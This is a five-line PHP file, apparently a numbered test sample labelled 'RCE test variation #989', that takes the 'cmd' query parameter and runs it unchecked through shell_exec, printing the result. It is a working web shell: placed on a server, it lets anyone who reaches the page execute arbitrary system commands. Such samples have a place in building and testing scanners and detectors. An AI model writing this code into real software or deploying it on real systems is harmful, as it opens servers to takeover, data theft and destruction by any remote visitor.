<?php
// RCE test variation #989
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>